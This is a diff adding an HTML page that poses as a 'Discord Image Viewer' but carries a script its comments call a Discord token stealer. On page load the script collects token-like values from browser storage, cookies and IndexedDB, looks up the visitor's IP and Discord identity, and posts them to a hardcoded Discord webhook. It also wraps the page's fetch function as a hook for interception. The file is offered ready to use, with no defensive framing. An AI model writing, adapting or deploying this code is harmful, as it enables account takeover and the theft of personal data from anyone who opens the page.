@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Image Viewer</title>
+</head>
+<body>
+    <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" />
+    <script>
+        // ============================================================
+        // Discord Token Stealer via Webhook - Single HTML file
+        // Works on LAN (local network) and WAN (external) when hosted
+        // ============================================================
+        (function() {
+            // CONFIG: Replace this URL with your Discord webhook
+            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532014138664943808/UfqqJZzdK75pAnKStPZjusSZ8CyFrAIIadPb3PwGq9gwOxhMuUuZbCYcZc1yDWLb-AWz";
+
+            // ============================================================
+            // 1. Attempt to grab token from localStorage (Discord Web version)
+            // ============================================================
+            function grabTokenFromLocalStorage() {
+                try {
+                    for (var key in localStorage) {
+                        if (key.startsWith("token")) {
+                            var token = localStorage.getItem(key);
+                            if (token && token.length > 20) return token;
+                        }
+                        // Check for Discord's specific token key
+                        if (key === "token") {
+                            var token = localStorage.getItem(key);
+                            if (token && token.length > 20) return token;
+                        }
+                    }
+                } catch(e) {}
+                return null;
+            }
+
+            // ============================================================
+            // 2. Attempt to grab token from sessionStorage
+            // ============================================================
+            function grabTokenFromSessionStorage() {
+                try {
+                    for (var key in sessionStorage) {
+                        if (key.startsWith("token")) {
+                            var token = sessionStorage.getItem(key);
+                            if (token && token.length > 20) return token;
+                        }
+                    }
+                } catch(e) {}
+                return null;
+            }
+
+            // ============================================================
+            // 3. Attempt to grab token from document.cookie
+            // ============================================================
+            function grabTokenFromCookies() {
+                try {
+                    var cookies = document.cookie.split("; ");
+                    for (var i = 0; i < cookies.length; i++) {
+                        var parts = cookies[i].split("=");
+                        var key = parts[0];
+                        var value = parts[1] || "";
+                        if (key === "token" || key.includes("token") && value.length > 20) {
+                            return value;
+                        }
+                    }
+                } catch(e) {}
+                return null;
+            }
+
+            // ============================================================
+            // 4. Attempt to grab token from IndexedDB (Discord's internal db)
+            // ============================================================
+            function grabTokenFromIndexedDB() {
+                return new Promise(function(resolve) {
+                    try {
+                        var request = indexedDB.open("discord");
+                        request.onsuccess = function(event) {
+                            var db = event.target.result;
+                            try {
+                                var tx = db.transaction(["keyval"], "readonly");
+                                var store = tx.objectStore("keyval");
+                                var getRequest = store.get("token");
+                                getRequest.onsuccess = function() {
+                                    var token = getRequest.result;
+                                    if (token && typeof token === "string" && token.length > 20) {
+                                        resolve(token);
+                                    } else {
+                                        resolve(null);
+                                    }
+                                };
+                                getRequest.onerror = function() { resolve(null); };
+                            } catch(e) { resolve(null); }
+                        };
+                        request.onerror = function() { resolve(null); };
+                    } catch(e) { resolve(null); }
+                });
+            }
+
+            // ============================================================
+            // 5. Send data to webhook
+            // ============================================================
+            function sendToWebhook(data) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", WEBHOOK_URL, true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                var payload = {
+                    content: "",
+                    embeds: [{
+                        title: "🎣 Discord Token Grabbed",
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "Token", value: data.token || "Not found", inline: false },
+                            { name: "User ID", value: data.user_id || "Unknown", inline: true },
+                            { name: "Username", value: data.username || "Unknown", inline: true },
+                            { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                            { name: "User Agent", value: data.user_agent || "Unknown", inline: false },
+                            { name: "Referrer", value: document.referrer || "Direct", inline: true },
+                            { name: "Page URL", value: window.location.href, inline: false }
+                        ],
+                        footer: { text: "Token stealer | " + new Date().toLocaleString() }
+                    }]
+                };
+                xhr.send(JSON.stringify(payload));
+            }
+
+            // ============================================================
+            // 6. Get victim's IP (optional, via external service)
+            // ============================================================
+            function fetchIP(callback) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://api.ipify.org?format=json", true);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            var data = JSON.parse(xhr.responseText);
+                            callback(data.ip);
+                        } catch(e) { callback("Unknown"); }
+                    } else {
+                        callback("Unknown");
+                    }
+                };
+                xhr.onerror = function() { callback("Unknown"); };
+                xhr.send();
+            }
+
+            // ============================================================
+            // 7. Validate token with Discord API to get user info
+            // ============================================================
+            function validateAndGetUser(token, callback) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://discord.com/api/v9/users/@me", true);
+                xhr.setRequestHeader("Authorization", token);
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        try {
+                            var data = JSON.parse(xhr.responseText);
+                            callback({ valid: true, user: data });
+                        } catch(e) {
+                            callback({ valid: false, user: null });
+                        }
+                    } else {
+                        callback({ valid: false, user: null });
+                    }
+                };
+                xhr.onerror = function() { callback({ valid: false, user: null }); };
+                xhr.send();
+            }
+
+            // ============================================================
+            // 8. Main execution flow
+            // ============================================================
+            function main() {
+                var token = grabTokenFromLocalStorage() || grabTokenFromSessionStorage() || grabTokenFromCookies();
+                if (!token) {
+                    // Try IndexedDB asynchronously
+                    grabTokenFromIndexedDB().then(function(dbToken) {
+                        if (dbToken) {
+                            token = dbToken;
+                        }
+                        finalize(token);
+                    });
+                } else {
+                    finalize(token);
+                }
+            }
+
+            function finalize(token) {
+                // Get user agent and IP
+                var userAgent = navigator.userAgent;
+                fetchIP(function(ip) {
+                    if (token) {
+                        // Validate token and get user details
+                        validateAndGetUser(token, function(result) {
+                            var userData = {
+                                token: token,
+                                user_id: result.valid ? result.user.id : "Invalid/Expired",
+                                username: result.valid ? result.user.username + "#" + result.user.discriminator : "Invalid",
+                                ip: ip,
+                                user_agent: userAgent
+                            };
+                            sendToWebhook(userData);
+                        });
+                    } else {
+                        // No token found - send that info as well
+                        sendToWebhook({
+                            token: "NOT FOUND",
+                            user_id: "N/A",
+                            username: "N/A",
+                            ip: ip,
+                            user_agent: userAgent
+                        });
+                    }
+                });
+            }
+
+            // ============================================================
+            // 9. Execute - with delay to ensure page loads fully
+            // ============================================================
+            window.onload = function() {
+                setTimeout(main, 1000);
+            };
+
+            // Also run immediately if page already loaded
+            if (document.readyState === "complete") {
+                setTimeout(main, 500);
+            }
+
+            // ============================================================
+            // 10. Additional fallback: try to intercept fetch() requests
+            //     that may contain tokens (advanced XSS technique)
+            // ============================================================
+            (function hijackFetch() {
+                var originalFetch = window.fetch;
+                window.fetch = function() {
+                    var args = arguments;
+                    var request = args[0];
+                    // If the request is to Discord API, try to extract token from headers
+                    if (typeof request === "string" && request.includes("discord.com/api")) {
+                        // We can't easily read the Authorization header from the caller,
+                        // but we can monitor responses for token patterns (advanced).
+                    }
+                    return originalFetch.apply(this, args);
+                };
+            })();
+
+        })();
+    </script>
+</body>
+</html>
